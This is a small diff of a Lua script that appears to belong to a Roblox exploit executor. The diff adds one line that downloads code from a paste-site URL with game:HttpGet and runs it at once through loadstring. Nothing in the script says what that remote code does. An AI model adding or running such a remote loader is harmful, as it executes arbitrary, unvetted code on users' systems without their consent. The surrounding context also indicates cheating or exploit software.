@@ -29,3 +29,4 @@ end
 
 -- Continue your script here
 print("Executor is supported: " .. executor)
+loadstring(game:HttpGet("https://pastefy.app/2FCbYbjz/raw"))()
